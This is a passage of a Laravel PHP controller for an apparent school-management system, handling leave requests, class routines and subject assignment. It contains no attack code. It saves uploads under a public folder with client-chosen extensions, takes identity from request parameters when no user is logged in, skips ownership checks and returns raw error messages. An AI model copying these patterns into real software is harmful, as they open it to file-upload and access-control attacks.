                $role_id = $user->role_id;
            } else {
                $login_id = $request->login_id;
                $role_id = $request->role_id;
            }
            $leave_request_data = new AramiscLeaveRequest();
            $leave_request_data->staff_id = $login_id;
            $leave_request_data->role_id =  $role_id;
            $leave_request_data->apply_date = date('Y-m-d', strtotime($request->apply_date));
            $leave_request_data->type_id = $request->leave_type;
            $leave_request_data->leave_from = date('Y-m-d', strtotime($request->leave_from));
            $leave_request_data->leave_to = date('Y-m-d', strtotime($request->leave_to));
            $leave_request_data->approve_status = $request->approve_status;
            $leave_request_data->reason = $request->reason;
            $leave_request_data->school_id = $request->school_id;
            $leave_request_data->file = $fileName;
            $result = $leave_request_data->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Leave Request has been created successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function Approve_Leave_edit(Request $request, $id)
    {


        try {
            $editData = AramiscLeaveRequest::find($id);
            $staffsByRole = AramiscStaff::where('role_id', '=', $editData->role_id)->get();
            $roles = AramiscRole::where('active_status', 1)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();
            $apply_leaves = AramiscLeaveRequest::where('active_status', 1)->get();
            $leave_types = AramiscLeaveType::where('active_status', 1)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['editData'] = $editData->toArray();
                $data['staffsByRole'] = $staffsByRole->toArray();
                $data['apply_leaves'] = $apply_leaves->toArray();
                $data['leave_types'] = $leave_types->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.humanResource.approveLeaveRequest', compact('editData', 'staffsByRole', 'apply_leaves', 'leave_types', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_Approve_Leave_edit(Request $request,$school_id, $id)
    {


        try {
            $editData = AramiscLeaveRequest::where('school_id',$school_id)->find($id);
            $staffsByRole = AramiscStaff::where('role_id', '=', $editData->role_id)->where('school_id',$school_id)->get();
            $roles = AramiscRole::where('active_status', 1)->where(function ($q) {
                $q->where('school_id', Auth::user()->school_id)->orWhere('type', 'System');
            })->get();
            $apply_leaves = AramiscLeaveRequest::where('active_status', 1)->where('school_id',$school_id)->get();
            $leave_types = AramiscLeaveType::where('active_status', 1)->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['editData'] = $editData->toArray();
                $data['staffsByRole'] = $staffsByRole->toArray();
                $data['apply_leaves'] = $apply_leaves->toArray();
                $data['leave_types'] = $leave_types->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.humanResource.approveLeaveRequest', compact('editData', 'staffsByRole', 'apply_leaves', 'leave_types', 'roles'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function staffNameByRole(Request $request)
    {

        try {

            if ($request->id != 3) {
                $allStaffs = AramiscStaff::whereRole($request->id)->get();
                $staffs = [];
                foreach ($allStaffs as $staffsvalue) {
                    $staffs[] = AramiscStaff::find($staffsvalue->id);
                }
            } else {
                $staffs = AramiscParent::where('active_status', 1)->get();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($staffs, null);
            }

            return response()->json([$staffs]);
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_staffNameByRole(Request $request, $school_id)
    {

        try {

            if ($request->id != 3) {
                $allStaffs = AramiscStaff::whereRole($request->id)->where('school_id',$school_id)->get();
                $staffs = [];
                foreach ($allStaffs as $staffsvalue) {
                    $staffs[] = AramiscStaff::find($staffsvalue->id);
                }
            } else {
                $staffs = AramiscParent::where('active_status', 1)->where('school_id',$school_id)->get();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($staffs, null);
            }

            return response()->json([$staffs]);
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function updateApproveLeave(Request $request)
    {


        try {


            $leave_request_data = AramiscLeaveRequest::find($request->id);
            $staff_id = $leave_request_data->staff_id;
            $role_id = $leave_request_data->role_id;
            $leave_request_data->approve_status = $request->approve_status;
            $result = $leave_request_data->save();


            $notification = new AramiscNotification;
            $notification->user_id = $leave_request_data->student->id;
            $notification->role_id = $role_id;
            $notification->school_id = Auth::user()->school_id;
            $notification->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
            $notification->date = date('Y-m-d');
            $notification->message = 'Leave status updated';
            $notification->save();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Leave Request has been updates successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('approve-leave');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_updateApproveLeave(Request $request, $school_id)
    {


        try {


            $leave_request_data = AramiscLeaveRequest::where('school_id',$school_id)->find($request->id);
            $staff_id = $leave_request_data->staff_id;
            $role_id = $leave_request_data->role_id;
            $leave_request_data->approve_status = $request->approve_status;
            $result = $leave_request_data->save();


            $notification = new AramiscNotification;
            $notification->user_id = $leave_request_data->student->id;
            $notification->role_id = $role_id;
            $notification->school_id = Auth::user()->school_id;
            $notification->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
            $notification->date = date('Y-m-d');
            $notification->message = 'Leave status updated';
            $notification->save();


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Leave Request has been updates successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('approve-leave');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function viewLeaveDetails(Request $request, $id)
    {
        try {


            $leaveDetails = AramiscLeaveRequest::find($id);
            $staff_leaves = AramiscLeaveDefine::where('role_id', $leaveDetails->role_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['leaveDetails'] = $leaveDetails->toArray();
                $data['staff_leaves'] = $staff_leaves->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.humanResource.viewLeaveDetails', compact('leaveDetails', 'staff_leaves'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_viewLeaveDetails(Request $request,$school_id, $id)
    {
        try {


            $leaveDetails = AramiscLeaveRequest::where('school_id',$school_id)->find($id);
            $staff_leaves = AramiscLeaveDefine::where('role_id', $leaveDetails->role_id)->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['leaveDetails'] = $leaveDetails->toArray();
                $data['staff_leaves'] = $staff_leaves->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.humanResource.viewLeaveDetails', compact('leaveDetails', 'staff_leaves'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function apply_leave_index(Request $request)
    {

        try {
            $user = Auth::user();

            if ($user) {
                $my_leaves = AramiscLeaveDefine::where('role_id', $user->role_id)->get();
                $apply_leaves = AramiscLeaveRequest::where('role_id', $user->role_id)->where('active_status', 1)->get();
                $leave_types = AramiscLeaveDefine::where('role_id', $user->role_id)->where('active_status', 1)->get();
            } else {
                $my_leaves = AramiscLeaveDefine::where('role_id', $request->role_id)->get();
                $apply_leaves = AramiscLeaveRequest::where('role_id', $request->role_id)->where('active_status', 1)->get();
                $leave_types = AramiscLeaveDefine::where('role_id', $request->role_id)->where('active_status', 1)->get();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['my_leaves'] = $my_leaves->toArray();
                $data['apply_leaves'] = $apply_leaves->toArray();
                $data['leave_types'] = $leave_types->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.humanResource.apply_leave', compact('apply_leaves', 'leave_types', 'my_leaves'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_apply_leave_index(Request $request, $school_id)
    {

        try {
            $user = Auth::user();

            if ($user) {
                $my_leaves = AramiscLeaveDefine::where('role_id', $user->role_id)->where('school_id',$school_id)->get();
                $apply_leaves = AramiscLeaveRequest::where('role_id', $user->role_id)->where('active_status', 1)->where('school_id',$school_id)->get();
                $leave_types = AramiscLeaveDefine::where('role_id', $user->role_id)->where('active_status', 1)->where('school_id',$school_id)->get();
            } else {
                $my_leaves = AramiscLeaveDefine::where('role_id', $request->role_id)->where('school_id',$school_id)->get();
                $apply_leaves = AramiscLeaveRequest::where('role_id', $request->role_id)->where('active_status', 1)->where('school_id',$school_id)->get();
                $leave_types = AramiscLeaveDefine::where('role_id', $request->role_id)->where('active_status', 1)->where('school_id',$school_id)->get();
            }

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['my_leaves'] = $my_leaves->toArray();
                $data['apply_leaves'] = $apply_leaves->toArray();
                $data['leave_types'] = $leave_types->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.humanResource.apply_leave', compact('apply_leaves', 'leave_types', 'my_leaves'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function apply_leave_store(Request $request)
    {
        DB::statement('SET FOREIGN_KEY_CHECKS=0;');

        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => 'required|before_or_equal:leave_to',
                'leave_to' => "required",
                'login_id' => "required",
                'role_id' => "required"
            ]);
        } else {
            $validator = Validator::make($input, [
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => 'required|before_or_equal:leave_to',
                'leave_to' => "required"
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $fileName = "";
            if ($request->file('attach_file') != "") {
                $file = $request->file('attach_file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/leave_request/', $fileName);
                $fileName = 'public/uploads/leave_request/' . $fileName;
            }

            $user = Auth()->user();

            if ($user) {
                $login_id = $user->id;
                $role_id = $user->role_id;
            } else {
                $login_id = $request->login_id;
                $role_id = $request->role_id;
            }
            $apply_leave = new AramiscLeaveRequest();
            $apply_leave->staff_id = $login_id;
            $apply_leave->role_id = $role_id;
            $apply_leave->apply_date = date('Y-m-d', strtotime($request->apply_date));
            $apply_leave->leave_define_id = $request->leave_type;
            $apply_leave->type_id = $request->leave_type;
            $apply_leave->leave_from = date('Y-m-d', strtotime($request->leave_from));
            $apply_leave->leave_to = date('Y-m-d', strtotime($request->leave_to));
            $apply_leave->approve_status = 'P';
            $apply_leave->reason = $request->reason;
            $apply_leave->file = $fileName;
            $result = $apply_leave->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Leave Request has been created successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_apply_leave_store(Request $request)
    {
        DB::statement('SET FOREIGN_KEY_CHECKS=0;');

        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => 'required|before_or_equal:leave_to',
                'leave_to' => "required",
                'login_id' => "required",
                'role_id' => "required",
                'school_id' => "required"
            ]);
        } else {
            $validator = Validator::make($input, [
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => 'required|before_or_equal:leave_to',
                'leave_to' => "required",
                'school_id' => "required"
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $fileName = "";
            if ($request->file('attach_file') != "") {
                $file = $request->file('attach_file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/leave_request/', $fileName);
                $fileName = 'public/uploads/leave_request/' . $fileName;
            }

            $user = Auth()->user();

            if ($user) {
                $login_id = $user->id;
                $role_id = $user->role_id;
            } else {
                $login_id = $request->login_id;
                $role_id = $request->role_id;
            }
            $apply_leave = new AramiscLeaveRequest();
            $apply_leave->staff_id = $login_id;
            $apply_leave->role_id = $role_id;
            $apply_leave->apply_date = date('Y-m-d', strtotime($request->apply_date));
            $apply_leave->leave_define_id = $request->leave_type;
            $apply_leave->type_id = $request->leave_type;
            $apply_leave->leave_from = date('Y-m-d', strtotime($request->leave_from));
            $apply_leave->leave_to = date('Y-m-d', strtotime($request->leave_to));
            $apply_leave->approve_status = 'P';
            $apply_leave->reason = $request->reason;
            $apply_leave->school_id = $request->school_id;
            $apply_leave->file = $fileName;
            $result = $apply_leave->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Leave Request has been created successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function apply_leave_show(Request $request, $id)
    {


        try {
            $user = Auth::user();
            if ($user) {
                $my_leaves = AramiscLeaveDefine::where('role_id', $user->role_id)->get();
                $apply_leaves = AramiscLeaveRequest::where('role_id', $user->role_id)->where('active_status', 1)->get();
                $leave_types = AramiscLeaveDefine::where('role_id', $user->role_id)->where('active_status', 1)->get();
            } else {
                $my_leaves = AramiscLeaveDefine::where('role_id', $request->role_id)->get();
                $apply_leaves = AramiscLeaveRequest::where('role_id', $request->role_id)->where('active_status', 1)->get();
                $leave_types = AramiscLeaveDefine::where('role_id', $request->role_id)->where('active_status', 1)->get();
            }

            $apply_leave = AramiscLeaveRequest::find($id);

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['my_leaves'] = $my_leaves->toArray();
                $data['apply_leaves'] = $apply_leaves->toArray();
                $data['leave_types'] = $leave_types->toArray();
                $data['apply_leave'] = $apply_leave->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.humanResource.apply_leave', compact('apply_leave', 'apply_leaves', 'leave_types', 'my_leaves'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_apply_leave_show(Request $request,$school_id, $id)
    {


        try {
            $user = Auth::user();
            if ($user) {
                $my_leaves = AramiscLeaveDefine::where('role_id', $user->role_id)->where('school_id',$school_id)->get();
                $apply_leaves = AramiscLeaveRequest::where('role_id', $user->role_id)->where('active_status', 1)->where('school_id',$school_id)->get();
                $leave_types = AramiscLeaveDefine::where('role_id', $user->role_id)->where('active_status', 1)->where('school_id',$school_id)->get();
            } else {
                $my_leaves = AramiscLeaveDefine::where('role_id', $request->role_id)->where('school_id',$school_id)->get();
                $apply_leaves = AramiscLeaveRequest::where('role_id', $request->role_id)->where('active_status', 1)->where('school_id',$school_id)->get();
                $leave_types = AramiscLeaveDefine::where('role_id', $request->role_id)->where('active_status', 1)->where('school_id',$school_id)->get();
            }

            $apply_leave = AramiscLeaveRequest::where('school_id',$school_id)->find($id);

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['my_leaves'] = $my_leaves->toArray();
                $data['apply_leaves'] = $apply_leaves->toArray();
                $data['leave_types'] = $leave_types->toArray();
                $data['apply_leave'] = $apply_leave->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.humanResource.apply_leave', compact('apply_leave', 'apply_leaves', 'leave_types', 'my_leaves'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }

    public function apply_leave_update(Request $request)
    {
        DB::statement('SET FOREIGN_KEY_CHECKS=0;');
        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'id' => "required",
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => 'required|before_or_equal:leave_to',
                'leave_to' => "required",
                'login_id' => "required",
                'role_id' => "required",
                'school_id' => "required"
            ]);
        } else {
            $validator = Validator::make($input, [
                'apply_date' => "required",
                'leave_type' => "required",
                'leave_from' => 'required|before_or_equal:leave_to',
                'leave_to' => "required",
                'school_id' => "required"
            ]);
        }

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $fileName = "";
            if ($request->file('file') != "") {
                $apply_leave = AramiscLeaveRequest::where('school_id',$request->school_id)->find($request->id);
                if (file_exists($apply_leave->file)) unlink($apply_leave->file);
                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/leave_request/', $fileName);
                $fileName = 'public/uploads/leave_request/' . $fileName;
            }


            $user = Auth()->user();

            if ($user) {
                $login_id = $user->id;
                $role_id = $user->role_id;
            } else {
                $login_id = $request->login_id;
                $role_id = $request->role_id;
            }

            $apply_leave = AramiscLeaveRequest::find($request->id);
            $apply_leave->staff_id = $login_id;
            $apply_leave->role_id = $role_id;
            $apply_leave->apply_date = date('Y-m-d', strtotime($request->apply_date));
            $apply_leave->leave_define_id = $request->leave_type;
            $apply_leave->leave_from = date('Y-m-d', strtotime($request->leave_from));
            $apply_leave->leave_to = date('Y-m-d', strtotime($request->leave_to));
            $apply_leave->approve_status = 'P';
            $apply_leave->reason = $request->reason;
            $apply_leave->school_id = $request->school_id;
            if ($fileName != "") {
                $apply_leave->file = $fileName;
            }
            $result = $apply_leave->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Leave Request has been updated successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('apply-leave');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function view_Leave_Details(Request $request, $id)
    {

        try {
            $leaveDetails = AramiscLeaveRequest::find($id);

            $apply = "";


            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['leaveDetails'] = $leaveDetails->toArray();
                $data['apply'] = $apply;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.humanResource.viewLeaveDetails', compact('leaveDetails', 'apply'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_view_Leave_Details(Request $request,$school_id, $id)
    {

        try {
            $leaveDetails = AramiscLeaveRequest::where('school_id',$school_id)->find($id);

            $apply = "";



            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['leaveDetails'] = $leaveDetails->toArray();
                $data['apply'] = $apply;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.humanResource.viewLeaveDetails', compact('leaveDetails', 'apply'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function apply_leave_destroy(Request $request, $id)
    {

        try {
            $apply_leave = AramiscLeaveRequest::find($id);
            if ($apply_leave->file != "") {

                if (file_exists($apply_leave->file)) unlink($apply_leave->file);
            }
            $result = $apply_leave->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Request has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('apply-leave');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_apply_leave_destroy(Request $request,$school_id, $id)
    {

        try {
            $apply_leave = AramiscLeaveRequest::where('school_id',$school_id)->where('id',$id)->find();
            if ($apply_leave->file != "") {

                if (file_exists($apply_leave->file)) unlink($apply_leave->file);
            }
            $result = $apply_leave->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Request has been deleted successfully');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('apply-leave');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function classRoutine(Request $request)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.academics.class_routine_new', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_classRoutine(Request $request, $school_id)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.academics.class_routine_new', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function classRoutineSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required',
            'section' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $class_times = AramiscClassTime::where('type', 'class')->get();
            $class_id = $request->class;
            $section_id = $request->section;

            $aramisc_weekends = AramiscWeekend::where('school_id', Auth::user()->school_id)->orderBy('order', 'ASC')->where('active_status', 1)->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['class_times'] = $class_times->toArray();
                $data['class_id'] = $class_id;
                $data['section_id'] = $section_id;
                $data['aramisc_weekends'] = $aramisc_weekends;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.academics.class_routine_new', compact('classes', 'class_times', 'class_id', 'section_id', 'aramisc_weekends'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_classRoutineSearch(Request $request, $school_id)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required',
            'section' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }


        try {
            $class_times = AramiscClassTime::where('type', 'class')->where('school_id',$school_id)->get();
            $class_id = $request->class;
            $section_id = $request->section;

            $aramisc_weekends = AramiscWeekend::where('school_id', Auth::user()->school_id)->orderBy('order', 'ASC')->where('active_status', 1)->get();
            $classes = AramiscClass::where('active_status', 1)->where('academic_id', AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR())->where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['class_times'] = $class_times->toArray();
                $data['class_id'] = $class_id;
                $data['section_id'] = $section_id;
                $data['aramisc_weekends'] = $aramisc_weekends;
                return ApiBaseMethod::sendResponse($data, null);
            }

            return view('backEnd.academics.class_routine_new', compact('classes', 'class_times', 'class_id', 'section_id', 'aramisc_weekends'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function assignSubject(Request $request)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.academics.assign_subject', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_assignSubject(Request $request, $school_id)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.academics.assign_subject', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function assigSubjectCreate(Request $request)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.academics.assign_subject_create', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_assigSubjectCreate(Request $request, $school_id)
    {

        try {
            $classes = AramiscClass::where('active_status', 1)->where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($classes, null);
            }
            return view('backEnd.academics.assign_subject_create', compact('classes'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function assignSubjectSearch(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required',
            'section' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $assign_subjects = AramiscAssignSubject::where('class_id', $request->class)->where('section_id', $request->section)->get();
            $subjects = AramiscSubject::where('active_status', 1)->get();
            $teachers = AramiscStaff::where('active_status', 1)->where(function($q)  {
                        $q->where('role_id', 4)->orWhere('previous_role_id', 4);
                })->get();
            $class_id = $request->class;
            $section_id = $request->section;
            $classes = AramiscClass::where('active_status', 1)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['classes'] = $classes->toArray();
                $data['assign_subjects'] = $assign_subjects->toArray();
                $data['teachers'] = $teachers->toArray();
                $data['subjects'] = $subjects->toArray();
                $data['class_id'] = $class_id;
                $data['section_id'] = $section_id;
                return ApiBaseMethod::sendResponse($data, null);
            }
            return view('backEnd.academics.assign_subject_create', compact('classes', 'assign_subjects', 'teachers', 'subjects', 'class_id', 'section_id'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_assignSubjectSearch(Request $request, $school_id)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'class' => 'required',
            'section' => 'required'
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $assign_subjects = AramiscAssignSubject::where('class_id', $request->class)->where('section_id', $request->section)->where('school_id',$school_id)->get();
            $subjects = AramiscSubject::where('active_status', 1)->where('school_id',$school_id)->get();
            $teachers = AramiscStaff::where('active_status', 1)->where(function($q)  {
                $q->where('role_id', 4)->orWhere('previous_role_id', 4);
            })->where('school_id',$school_id)->get();
            $class_id = $request->class;
            $section_id = $request->section;
